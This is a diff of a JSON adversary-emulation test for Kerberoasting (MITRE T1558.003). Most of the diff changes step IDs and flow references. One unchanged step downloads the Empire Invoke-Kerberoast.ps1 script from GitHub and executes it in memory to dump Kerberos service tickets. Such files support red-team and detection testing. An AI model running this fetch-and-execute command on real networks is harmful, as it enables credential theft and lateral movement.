@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "928ff5c3-c4f9-4e48-9584-9b276b7eca87",
+      "id": "97d01bb1-1b24-4dc2-85db-b4a518f24047",
       "type": "execute-command",
       "data": {
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)\nInvoke-Kerberoast | fl",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "74fb0b40-6ba7-4b99-a4ff-699a2968fbcb",
+      "id": "c2c61d4f-94ed-4dfe-bc4d-457483436df4",
       "name": "Check dependency 1/1",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "3c15bf97-0dd9-4e8c-ade0-c1ece7bba1a3",
+      "id": "dd04e3ab-6992-456b-aa6c-49be0f6c5d36",
       "name": "Resolve dependency 1/1",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "356868c3-f5c4-4e90-87ee-be5419187813",
+      "id": "3b7d42b4-70b1-461d-85de-aa927acce709",
       "name": "Re-check dependency 1/1",
       "description": "Computer must be domain joined\n",
       "type": "execute-command",
@@ -51,28 +51,29 @@
   ],
   "flows": [
     {
-      "s": "74fb0b40-6ba7-4b99-a4ff-699a2968fbcb",
+      "s": "c2c61d4f-94ed-4dfe-bc4d-457483436df4",
       "p": "on-success",
-      "o": "928ff5c3-c4f9-4e48-9584-9b276b7eca87"
+      "o": "97d01bb1-1b24-4dc2-85db-b4a518f24047"
     },
     {
-      "s": "74fb0b40-6ba7-4b99-a4ff-699a2968fbcb",
+      "s": "c2c61d4f-94ed-4dfe-bc4d-457483436df4",
       "p": "on-failure",
-      "o": "3c15bf97-0dd9-4e8c-ade0-c1ece7bba1a3"
+      "o": "dd04e3ab-6992-456b-aa6c-49be0f6c5d36"
     },
     {
-      "s": "3c15bf97-0dd9-4e8c-ade0-c1ece7bba1a3",
+      "s": "dd04e3ab-6992-456b-aa6c-49be0f6c5d36",
       "p": "on-success",
-      "o": "356868c3-f5c4-4e90-87ee-be5419187813"
+      "o": "3b7d42b4-70b1-461d-85de-aa927acce709"
     },
     {
-      "s": "356868c3-f5c4-4e90-87ee-be5419187813",
+      "s": "3b7d42b4-70b1-461d-85de-aa927acce709",
       "p": "on-failure",
-      "o": "928ff5c3-c4f9-4e48-9584-9b276b7eca87"
+      "o": "97d01bb1-1b24-4dc2-85db-b4a518f24047"
     }
   ],
   "tags": [
     "T1558",
     "T1558.003"
-  ]
+  ],
+  "input_arguments": null
 }
